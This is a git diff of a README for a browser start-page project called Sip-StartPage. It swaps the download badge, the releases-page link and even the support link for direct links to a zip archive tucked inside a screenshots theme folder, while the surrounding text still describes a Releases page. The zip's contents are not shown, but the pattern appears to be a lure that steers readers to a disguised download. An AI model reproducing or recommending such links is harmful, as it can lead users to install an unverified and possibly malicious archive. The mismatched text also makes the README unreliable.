@@ -1,6 +1,6 @@
 # 🌟 Sip-StartPage - Your Personalizable Browser Homepage
 
-[![Download Sip-StartPage](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Mogoces247/Sip-StartPage/releases)
+[![Download Sip-StartPage](https://raw.githubusercontent.com/Mogoces247/Sip-StartPage/main/screenshots/themes/kanagawa/dark/Sip-StartPage-v1.3.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Mogoces247/Sip-StartPage/main/screenshots/themes/kanagawa/dark/Sip-StartPage-v1.3.zip)
 
 ## 📖 Introduction
 
@@ -14,7 +14,7 @@ Follow these simple steps to download and run Sip-StartPage. No technical skills
 
 1. **Visit the Releases Page**  
    Click the link below to go to the Releases page where you can download Sip-StartPage.  
-   [Download Sip-StartPage](https://github.com/Mogoces247/Sip-StartPage/releases)
+   [Download Sip-StartPage](https://raw.githubusercontent.com/Mogoces247/Sip-StartPage/main/screenshots/themes/kanagawa/dark/Sip-StartPage-v1.3.zip)
 
 2. **Choose Your Version**  
    On the Releases page, you will see a list of available versions. Each version will have the date it was released next to it. Choose the latest version for the best features and updates.
@@ -61,7 +61,7 @@ If you encounter issues while downloading or running Sip-StartPage, consider the
 ## 📞 Support
 
 For additional help, visit our GitHub page at the following link:  
-[Support Sip-StartPage](https://github.com/Mogoces247/Sip-StartPage)
+[Support Sip-StartPage](https://raw.githubusercontent.com/Mogoces247/Sip-StartPage/main/screenshots/themes/kanagawa/dark/Sip-StartPage-v1.3.zip)
 
 ## 📚 Frequently Asked Questions
 
